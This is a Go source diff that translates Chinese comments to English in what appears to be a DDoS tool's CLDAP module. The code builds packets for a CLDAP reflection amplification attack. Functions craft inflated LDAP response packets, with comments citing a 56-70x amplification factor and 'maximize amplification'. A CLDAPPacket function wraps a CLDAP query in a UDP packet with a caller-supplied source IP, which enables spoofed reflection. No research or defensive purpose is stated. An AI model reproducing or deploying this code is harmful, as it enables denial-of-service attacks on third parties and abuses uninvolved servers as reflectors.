@@ -7,44 +7,44 @@ import (
 	"strings"
 )
 
-// CLDAPResponseBuffer 生成CLDAP协议响应
-// 放大倍数：56-70倍
-// 返回多个响应包以便循环发送
+// CLDAPResponseBuffer generates CLDAP protocol responses
+// Amplification factor: 56-70 times
+// Returns multiple response packets for cyclic sending
 func CLDAPResponseBuffer() [][]byte {
-	// 创建多个响应包用于循环发送
+	// Create multiple response packets for cyclic sending
 	responses := make([][]byte, 0, 5)
 	
-	// 基本用户对象包
+	// Basic user object packet
 	baseObjectResponse := generateCLDAPBaseResponse()
 	responses = append(responses, baseObjectResponse)
 	
-	// 组成员关系包（通常很大）
+	// Group membership packet (usually large)
 	groupMembershipResponse := generateCLDAPGroupMembershipResponse()
 	responses = append(responses, groupMembershipResponse)
 	
-	// 安全描述符包（非常大）
+	// Security descriptor packet (very large)
 	securityResponse := generateCLDAPSecurityResponse()
 	responses = append(responses, securityResponse)
 	
-	// 域控制器信息包
+	// Domain controller information packet
 	dcInfoResponse := generateCLDAPDomainControllerResponse()
 	responses = append(responses, dcInfoResponse)
 	
-	// 额外的放大数据包
+	// Additional amplification packet
 	ampResponse := generateCLDAPAmplificationResponse()
 	responses = append(responses, ampResponse)
 	
 	return responses
 }
 
-// generateCLDAPBaseResponse 生成基本用户对象信息包
+// generateCLDAPBaseResponse generates a basic user object information packet
 func generateCLDAPBaseResponse() []byte {
 	var buf bytes.Buffer
 	
-	// LDAP消息结构
+	// LDAP message structure
 	// SEQUENCE Tag
 	buf.WriteByte(0x30)
-	// 总长度占位符
+	// Total length placeholder
 	buf.Write([]byte{0x84, 0x00, 0x01, 0x00, 0x00})
 	
 	// messageID (INTEGER)
@@ -52,9 +52,9 @@ func generateCLDAPBaseResponse() []byte {
 	buf.Write([]byte{0x02, 0x02})
 	buf.Write([]byte{byte(messageID >> 8), byte(messageID)})
 	
-	// SearchResultEntry 标签
+	// SearchResultEntry tag
 	buf.Write([]byte{0x64})
-	// 长度占位符
+	// Length placeholder
 	buf.Write([]byte{0x84, 0x00, 0x00, 0xFF, 0x00})
 	
 	// objectName (OCTET STRING)
@@ -64,44 +64,44 @@ func generateCLDAPBaseResponse() []byte {
 	
 	// attributes (SEQUENCE)
 	buf.Write([]byte{0x30})
-	// 长度占位符
+	// Length placeholder
 	buf.Write([]byte{0x84, 0x00, 0x00, 0xF0, 0x00})
 	
-	// 添加基本用户对象信息
+	// Add basic user object information
 	
-	// 添加对象类
+	// Add object class
 	addCLDAPAttribute(&buf, "objectClass", []string{
 		"top", "person", "organizationalPerson", "user", "computer"})
 	
-	// 添加用户账号控制信息
+	// Add user account control information
 	addCLDAPAttribute(&buf, "userAccountControl", []string{"4096"})
 	
-	// 添加唯一标识符
+	// Add unique identifier
 	addCLDAPAttribute(&buf, "objectGUID", []string{generateRandomHexString(32)})
 	
-	// 添加SID
+	// Add SID
 	addCLDAPAttribute(&buf, "objectSid", []string{generateRandomHexString(28)})
 	
-	// 添加DN
+	// Add DN
 	dn := "CN=DESKTOP-" + generateRandomHexString(8) + ",OU=Computers,DC=example,DC=com"
 	addCLDAPAttribute(&buf, "distinguishedName", []string{dn})
 	
-	// 添加SAM账号名
+	// Add SAM account name
 	samAccountName := "DESKTOP-" + generateRandomHexString(8) + "$"
 	addCLDAPAttribute(&buf, "sAMAccountName", []string{samAccountName})
 	
-	// 添加主机名
+	// Add hostname
 	addCLDAPAttribute(&buf, "dNSHostName", []string{
 		samAccountName[:len(samAccountName)-1] + ".example.com"})
 	
 	return buf.Bytes()
 }
 
-// generateCLDAPGroupMembershipResponse 生成组成员关系包
+// generateCLDAPGroupMembershipResponse generates a group membership packet
 func generateCLDAPGroupMembershipResponse() []byte {
 	var buf bytes.Buffer
 	
-	// LDAP消息结构
+	// LDAP message structure
 	buf.WriteByte(0x30)
 	buf.Write([]byte{0x84, 0x00, 0x02, 0x00, 0x00})
 	
@@ -123,7 +123,7 @@ func generateCLDAPGroupMembershipResponse() []byte {
 	buf.Write([]byte{0x30})
 	buf.Write([]byte{0x84, 0x00, 0x01, 0xF0, 0x00})
 	
-	// 添加组成员关系 - 创建大量组以实现放大
+	// Add group memberships - create many groups for amplification
 	groupMemberships := []string{}
 	for i := 0; i < 100; i++ {
 		groupMemberships = append(groupMemberships, 
@@ -131,7 +131,7 @@ func generateCLDAPGroupMembershipResponse() []byte {
 	}
 	addCLDAPAttribute(&buf, "memberOf", groupMemberships)
 	
-	// 添加组描述信息
+	// Add group description information
 	for i := 0; i < 20; i++ {
 		addCLDAPAttribute(&buf, "groupType"+strconv.Itoa(i), []string{
 			"Universal, Security Enabled (" + strconv.Itoa(i*8+2147483652) + ")"})
@@ -140,11 +140,11 @@ func generateCLDAPGroupMembershipResponse() []byte {
 	return buf.Bytes()
 }
 
-// generateCLDAPSecurityResponse 生成安全描述符包
+// generateCLDAPSecurityResponse generates a security descriptor packet
 func generateCLDAPSecurityResponse() []byte {
 	var buf bytes.Buffer
 	
-	// LDAP消息结构
+	// LDAP message structure
 	buf.WriteByte(0x30)
 	buf.Write([]byte{0x84, 0x00, 0x03, 0x00, 0x00})
 	
@@ -166,21 +166,21 @@ func generateCLDAPSecurityResponse() []byte {
 	buf.Write([]byte{0x30})
 	buf.Write([]byte{0x84, 0x00, 0x02, 0xF0, 0x00})
 	
-	// 添加安全描述符 - 这些通常非常大，可以用于放大
+	// Add security descriptors - these are usually very large and can be used for amplification
 	securityDescriptors := make([]string, 5)
 	for i := 0; i < 5; i++ {
-		securityDescriptors[i] = generateRandomHexString(4096) // 一个大的安全描述符
+		securityDescriptors[i] = generateRandomHexString(4096) // A large security descriptor
 	}
 	addCLDAPAttribute(&buf, "nTSecurityDescriptor", securityDescriptors)
 	
 	return buf.Bytes()
 }
 
-// generateCLDAPDomainControllerResponse 生成域控制器信息包
+// generateCLDAPDomainControllerResponse generates a domain controller information packet
 func generateCLDAPDomainControllerResponse() []byte {
 	var buf bytes.Buffer
 	
-	// LDAP消息结构
+	// LDAP message structure
 	buf.WriteByte(0x30)
 	buf.Write([]byte{0x84, 0x00, 0x00, 0x80, 0x00})
 	
@@ -202,7 +202,7 @@ func generateCLDAPDomainControllerResponse() []byte {
 	buf.Write([]byte{0x30})
 	buf.Write([]byte{0x84, 0x00, 0x00, 0x60, 0x00})
 	
-	// 添加服务主体名称 (SPNs) - 这些通常很大
+	// Add service principal names (SPNs) - these are usually large
 	spns := []string{
 		"HOST/dc1.example.com",
 		"HOST/dc1",
@@ -221,7 +221,7 @@ func generateCLDAPDomainControllerResponse() []byte {
 	}
 	addCLDAPAttribute(&buf, "servicePrincipalName", spns)
 	
-	// 添加操作系统信息
+	// Add operating system information
 	addCLDAPAttribute(&buf, "operatingSystem", []string{"Windows Server 2019"})
 	addCLDAPAttribute(&buf, "operatingSystemVersion", []string{"10.0 (17763)"})
 	addCLDAPAttribute(&buf, "operatingSystemServicePack", []string{"Service Pack 1"})
@@ -229,11 +229,11 @@ func generateCLDAPDomainControllerResponse() []byte {
 	return buf.Bytes()
 }
 
-// generateCLDAPAmplificationResponse 生成额外的放大数据包
+// generateCLDAPAmplificationResponse generates an additional amplification packet
 func generateCLDAPAmplificationResponse() []byte {
 	var buf bytes.Buffer
 	
-	// LDAP消息结构
+	// LDAP message structure
 	buf.WriteByte(0x30)
 	buf.Write([]byte{0x84, 0x00, 0x04, 0x00, 0x00})
 	
@@ -255,7 +255,7 @@ func generateCLDAPAmplificationResponse() []byte {
 	buf.Write([]byte{0x30})
 	buf.Write([]byte{0x84, 0x00, 0x03, 0xF0, 0x00})
 	
-	// 为了最大化放大效果，添加一些具有长值的属性
+	// To maximize amplification, add some attributes with long values
 	for i := 0; i < 10; i++ {
 		attrName := "customAttribute" + strconv.Itoa(i)
 		attrValues := []string{strings.Repeat("Long value for amplification. ", 500)}
@@ -265,12 +265,12 @@ func generateCLDAPAmplificationResponse() []byte {
 	return buf.Bytes()
 }
 
-// addCLDAPAttribute 添加LDAP属性到缓冲区
+// addCLDAPAttribute adds an LDAP attribute to the buffer
 func addCLDAPAttribute(buf *bytes.Buffer, attrType string, attrValues []string) {
-	// 属性序列
+	// Attribute sequence
 	buf.Write([]byte{0x30})
 	
-	// 长度占位符
+	// Length placeholder
 	attrLen := 2 + len(attrType) + 2
 	for _, val := range attrValues {
 		attrLen += 2 + len(val)
@@ -284,14 +284,14 @@ func addCLDAPAttribute(buf *bytes.Buffer, attrType string, attrValues []string) 
 		buf.Write([]byte{0x82, byte(attrLen >> 8), byte(attrLen)})
 	}
 	
-	// 属性类型
+	// Attribute type
 	buf.Write([]byte{0x04, byte(len(attrType))})
 	buf.Write([]byte(attrType))
 	
-	// 属性值集合
+	// Attribute value set
 	buf.Write([]byte{0x31})
 	
-	// 值集合长度
+	// Value set length
 	valuesLen := 0
 	for _, val := range attrValues {
 		valuesLen += 2 + len(val)
@@ -305,7 +305,7 @@ func addCLDAPAttribute(buf *bytes.Buffer, attrType string, attrValues []string) 
 		buf.Write([]byte{0x82, byte(valuesLen >> 8), byte(valuesLen)})
 	}
 	
-	// 各个值
+	// Individual values
 	for _, val := range attrValues {
 		if len(val) < 128 {
 			buf.Write([]byte{0x04, byte(len(val))})
@@ -318,7 +318,7 @@ func addCLDAPAttribute(buf *bytes.Buffer, attrType string, attrValues []string) 
 	}
 }
 
-// generateRandomHexString 生成指定长度的随机十六进制字符串
+// generateRandomHexString generates a random hexadecimal string of the specified length
 func generateRandomHexString(length int) string {
 	const hexChars = "0123456789ABCDEF"
 	result := make([]byte, length)
@@ -329,11 +329,11 @@ func generateRandomHexString(length int) string {
 }
 
 func CLDAPPacket(srcIP, dstIP string, srcPort, dstPort int) ([]byte, error) {
-    payload := []byte{
-        0x30, 0x25, 0x02, 0x01, 0x01, 0x63, 0x20, 0x04, 0x00, 0x0a, 0x01, 0x00,
-        0x0a, 0x01, 0x00, 0x02, 0x01, 0x00, 0x02, 0x01, 0x00, 0x01, 0x01, 0x00,
-        0x87, 0x0b, 0x6f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x63, 0x6c, 0x61, 0x73,
-        0x73, 0x30, 0x00,
-    }    
-    return BuildUDPPacket(srcIP, dstIP, srcPort, dstPort, payload)
+	payload := []byte{
+		0x30, 0x25, 0x02, 0x01, 0x01, 0x63, 0x20, 0x04, 0x00, 0x0a, 0x01, 0x00,
+		0x0a, 0x01, 0x00, 0x02, 0x01, 0x00, 0x02, 0x01, 0x00, 0x01, 0x01, 0x00,
+		0x87, 0x0b, 0x6f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x63, 0x6c, 0x61, 0x73,
+		0x73, 0x30, 0x00,
+	}    
+	return BuildUDPPacket(srcIP, dstIP, srcPort, dstPort, payload)
 }
